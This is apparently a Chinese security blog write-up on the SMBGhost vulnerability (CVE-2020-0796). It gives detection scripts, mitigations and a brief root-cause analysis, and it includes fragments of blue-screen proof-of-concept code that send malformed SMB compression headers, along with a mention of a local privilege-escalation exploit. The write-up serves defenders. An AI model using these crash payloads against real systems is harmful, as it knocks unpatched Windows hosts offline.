# 0x00 概述
20200310，microsoft透露了一个smb v3协议漏洞。  
20200312，microsoft出补丁。  
漏洞命名：smbghost/deepblue......  
Microsoft Server Message Block
3.1.1（SMBv3）协议处理某些请求的方式中存在远程执行代码漏洞，可以在目标smb服务器或客户端上执行代码。  
为了利用针对服务器的漏洞，未经身份验证的攻击者可以将特制数据包发送到目标SMBv3服务器；若要利用针对客户端的漏洞，未经身份验证的攻击者将需要配置恶意的SMBv3服务器，并诱使用户连接到该服务器。
# 0x01 影响范围
Windows 10 Version 1903 for 32-bit Systems  
Windows 10 Version 1903 for x64-based Systems  
Windows 10 Version 1903 for ARM64-based Systems  
Windows Server, Version 1903 (Server Core installation)  
Windows 10 Version 1909 for 32-bit Systems  
Windows 10 Version 1909 for x64-based Systems  
Windows 10 Version 1909 for ARM64-based Systems  
Windows Server, Version 1909 (Server Core installation)  
只影响 SMB v3.1.1，1903和1909
# 0x02 漏洞检测
//至发文（20200322）暂未发现公开EXP。  
环境win10x64-1903专业版，关闭防火墙，关闭自动更新！  
## python版
> It checks for SMB dialect 3.1.1 and compression capability through a
> negotiate request.  
>  \---README.md
socket发送数据包
    pkt = b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
返回判断
    if res[68:70] != b"\x11\x03" or res[70:72] != b"\x02\x00":
            print(f"{ip} Not vulnerable.")
        else:
            print(f"{ip} Vulnerable")
然而打上补丁修补后：  
所以打上补丁后该脚本也会返回vulnerable导致误报。
## python版带数据结构输出
此脚本判断是否已启用SMBv3.1.1和SMB压缩，同1）也会误报  
pip3 install hexdump  
同样也是判断这两个位置
    version = struct.unpack("H", response[68:70])[0]
    context = struct.unpack("H", response[70:72])[0]
    if version != 0x0311:
        print(f"SMB version {hex(version)} was found which is not vulnerable!")
    elif context != 2:
        print(f"Server answered with context {hex(context)} which indicates that the target may not have SMB compression enabled and is therefore not vulnerable!")
    else:
    print(f"SMB version {hex(version)} with context {hex(context)} was found which indicates SMBv3.1.1 is being used and SMB compression is enabled, therefore being vulnerable to CVE-2020-0796!")
//另外还有这个py检查smb版本和压缩，也可以试试  
## exe版本（奇安信）
都准确！  
## powershell版本
没打补丁：  
打补丁后：  
判断版本和补丁，简单直接，不会误报。
    if ($WindowsVersion -eq 1903) {
            Write-Host "[*] CVE-2020-0976 is applicable to your Windows Version."
        }
        Elseif ($WindowsVersion -eq 1909) {
            Write-Host "[*] CVE-2020-0976 is applicable to your Windows Version."
        }
        Else {
            Write-Host "[+] CVE-2020-0976 is not applicable to your Windows Version." -ForegroundColor Green
            pause
            return
    }
    ......
    function CheckIfUpdateIsInstalled {
        Write-Host "[*] Check if KB4551762 is installed..."
        $fix = Get-HotFix -Id KB4551762 -ErrorAction SilentlyContinue
        if ($fix) {
            Write-Host "[+] *** Windows Update $($fix.HotFixID) is installed on $($fix.InstalledOn). You're not vulnerable ***"
            Write-Host "[+] No workaround needed, you can still customize the SMBv3 compression if you like."
            return
        }
        Else {
            Write-Host "[-] Windows Update $($kb) is not installed."
    }
## perl版本
也是用socket发包，返回判断两个位置
    if(($byteArray[68] == 17 && $byteArray[70] == 2) || ($byteArray[70] == 2 && $byteArray[72] == 85)) {
            say 'vulnerable';
        }
        else {
            say 'not vulnerable';
        }
## nmap版本
调用nmap的smb协议扫描脚本检查是否有smbv3.11
    nmap -p445 --script smb-protocols -Pn -n $1 | grep -P '\d+\.\d+\.\d+\.\d+|^\|.\s+3.11' | tr '\n' ' ' | replace 'Nmap scan report for' '@' | tr "@" "\n" | grep 3.11 | tr '|' ' ' | tr '_' ' ' | grep -oP '\d+\.\d+\.\d+\.\d+'
    if [[ $? != 0 ]]; then
        echo "There's no SMB v3.11"
    fi
还有一些nse脚本：  
## 规则版本
## 蓝屏POC
1）  
    def _compress(self, b_data, session):
            header = SMB2CompressionTransformHeader()
            header['original_size'] = len(b_data)
            header['offset'] = 4294967295
            header['data'] = smbprotocol.lznt1.compress(b_data)
python3 CVE-2020-0796.py 19.1.2.56  
2）  
    class Smb2CompressedTransformHeader:
        def __init__(self, data):
            self.data = data
            self.protocol_id = "\xfcSMB"
            self.original_decompressed_size = struct.pack('
    def attack(self):
            compressedHeader = SMB2_COMPRESSION_TRANSFORM_HEADER ()
            compressedHeader['ProtocolID'] = 0x424D53FC
            compressedHeader['OriginalCompressedSegmentSize'] = 1024
            compressedHeader['CompressionAlgorithm'] = 1
            compressedHeader['Flags'] = 0xffff
            compressedHeader['Offset_Length'] = 0xffffffff
git clone   
cd impacket  
sudo python setup.py install  
# 0x03 漏洞利用
## LPE
20200330，网上出现本地提权EXP：  
利用smbghost漏洞将shellcode注入winlogon.exe。  
//已编译版本：  
//
打补丁前：  
打补丁后：  
# 0x04 修复方案
1】设置-更新和安全-Windows更新-检查更新  
或直接下载对应补丁进行安装（KB4551762）  
2】regedit
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters建立一个名为DisableCompression的DWORD，值为1，禁止SMB的压缩功能。  
或powershell  
Set-ItemProperty -Path
"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
DisableCompression -Type DWORD -Value 1 -Force  
3】封445端口
# 0x05 简单分析
smb服务端漏洞文件srv2.sys（C:\Windows\System32\drivers\srv2.sys）  
smb客户端漏洞文件mrxsmb.sys  
都在SmbCompressDecompress中调用了相同的代码。  
分析srv2.sys：  
（ida加载srv2.sys不显示函数名是因为没有符号表，要科学上网再在ida提示的时候点yes下载，或者利用windbg\symchk.exe下载）  
微软在Windows 10 v1903/Windows Server v1903的SMB
3.1.1协议中开启了对数据压缩传输的支持,本漏洞成因是SMB客户端及服务端在准备解压数据（身份认证请求）时,没有对COMPRESSION_TRANSFORM_HEADE结构进行安全校验,导致后续分配buffer时整形溢出。
    typedef struct _COMPRESSION_TRANSFORM_HEADER
        {
          ULONG ProtocolId;
          ULONG OriginalCompressedSegmentSize;